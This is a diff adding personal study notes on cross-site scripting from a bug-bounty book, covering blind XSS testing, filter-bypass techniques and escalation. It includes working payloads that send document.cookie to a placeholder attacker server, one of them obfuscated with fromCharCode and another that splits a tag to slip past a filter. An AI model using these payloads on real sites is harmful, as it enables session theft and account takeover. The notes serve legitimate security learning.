@@ -1225,7 +1225,96 @@ javascript:"/*\"/*' /*</template>
 </style><script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
 ```
 
-- This polyglot contains multiple ways of creating an XSS so if one method fails, another method could still work.
--
+- The above polyglot contains multiple ways of creating an XSS so if one method fails, another method could still work.
+- Another efficient way of testing for XSS is to use generic test strings like: `>'<"//:=;!--`
+  - You can use a generic string like this to see which special characters are escaped, and which ones aren't.
+  - If you find that some or all of the special characters are not escaped, you can then build a payload around the ones that aren't.
+- Blind XSS are harder to detect because you cannot see the reflected input, and you can't test them by generating an alert box.
+  - To test them, you'll need to try to make a victim's browser generate a request to a server of your own.
+  - ex: Submit the following payload which will make the victim's browser request the page /xss on your server:
+    `<script src='http://YOUR_SERVER_IP/xss'></script>`
+  - You will then inspect your server logs to see if anyone requests that page. If you see a request to /xss, the XSS was successful.
+- Fuzzing is a great way to test for XSS automatically is through fuzzing. This is covered in Chapter 25.
+  - Note: Hackers generally discover new XSS manually, but a good way to find out where to start can be done through fuzzing.
+
+**Step 3: Confirm the Impact**
+
+- Keep in mind that the site may use the user input to construct something other than the next returned page.
+  - Your input should be use to construct other web pages, email, and file portals.
+  - There may be a time delay between when you submit the payload and when it executes. Common in log files and analytics pages.
+    - If targetting log files and analytic pages, your payload may be executed later or in another users account.
+  - Payloads may only execute under certain conditions, like an admit being logged in, or when the user actively clicks or hovers certain HTML elements.
+  - Browse to the necessary pages and perform these actions yourself - if possible.
+
+#### Bypass XSS Protection
+
+**Alternative JavaScript Syntax**
+
+- `<script><script/>` tags are often filtered out, instead you could use an HTML image tag, `<img src="USER_INPUT">`
+- Instead of closing out an img tag and inserting a script tag (`<img src="/><script>alert('Vulnerable to XSS');</script>"/>`), you could insert the JavaScript directly as an attribute to the current tag: `<img src="123" onerror="alert('Vulnerable to XSS');"/>`
+- Use the special URL schemes from earlier: `<a href="javascript:alert('Vulnerable to XSS')>Click me!</a>"`
+
+**Capitalization and Encoding**
+
+- "You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters for only the string "script", capitalize certain letters in your payload": `<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>`
+- If the app filters special HTML characters like single and double quotes, you could use the JavaScript `fromCharCode()` function which maps numeric codes to the corresponding ASCII characters.
+  - The following is equivalent to `"http://attacker_server_ip/?c="`:
+    `String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)`
+  - Using this in conjunction with capitalization could look like this: `<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookies;</scrIPT>`
+  - You can convert strings using an online JavaScript editor like [https://js.do/](https://js.do) by copying the following code and changing `encoded = "INPUT_STRING"` to whatever you're trying to translate and then clicking the "Run code" button on the top left of the code window:
+    ```
+    <script>
+    function ascii(c){
+      return c.charCodeAt();
+    }
+    encoded = "INPUT_STRING".split("").map(ascii);
+    document.write(encoded);
+    </script>
+    ```
+  - I've written a python script to be able to convert strings locally or to be used in a larger framework [here](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/convert_to_charcode.py).
+
+**Filter Logic Errors**
+
+- "...sometimes application remove all `<script>` tags in the user input to prevent XSS, but do it only once. If that's the case, you can use a payload like this:"
+  `<scrip<script>t>
+location='http://attacker_server_ip/c='+document.cookie;
+</scrip</script>t>`
+  - By cutting the script tag in two, the filter may not recognize the broken script tag and once the complete script tag is removed, the intact script tag forms the payload.
+- XSS protection is hard to do right, that's why XSS is still prevalent today.
+- More filter-bypass ideas on OWASP's XSS filter evasion [cheat sheet](https://owaps.org/www-community/xss-filter-evasion-cheatsheet).
+  - Or, Google XSS "filter bypass".
+
+**Escalating the Attack**
+
+- Stored XSS on a public forum can attack anyone who visits the forum page, and is considered the most severe.
+- Reflected or DOM XSS can only affect users who click the malicious link.
+- If you find a stored XSS vulnerability in server logs, the XSS can take over admin sessions.
+  - If you can take over one of these high privileged accounts, the XSS could compromise the integrity of the entire application.
+  - You could gain access to customer information, internal files, API keys, you might even be able to escalate into RCE by uploading a shell or execute scripts as the admin.
+- You may also be able to steal the Cross Site Request Forgery (CSRF) token embedded on the victim's page. If you can steal the CSRF token, you can execute actions on their behalf by using those tokens to bypass CSRF protections (Chapter 9).
+- "XSS can also be used to dynamically alter the page the victim sees, so you can replace the page with a fake login page and trick the user into giving you their credentials."
+- "XSS can also allow attackers to automatically redirect the victim to malicious pages and perform other harmful operations while posing as the legit site, such as installing malware."
+
+**Automating XSS Hunting**
+
+- Use tools to make your XSS hunt more efficient instead of inspecting all of the different request parameters individually.
+- Use browser developer tools to look for syntax errors and troubleshoot your payloads.
+  - Use a proxy's search tool to search server responses for reflected input.
+- Use BurpSuite or Zap to do an automatic XSS scan on the target.
+
+**Finding Your First XSS!**
+
+"
+
+1. Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS.
+2. Insert XSS payloads into the user input fields you've found. Insert payloads from lists online, a polyglot payload, or a generic test string.
+3. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
+4. If you can't get any payloads to execute, try bypassing XSS protections.
+5. Automate teh XSS hunting process with techniques introduced in Chapter 25.
+6. Consider the impact of the XSS you've found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you've found?
+7. Send your first XSS report to a bug bounty program!
+   "
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 7: Open Redirects
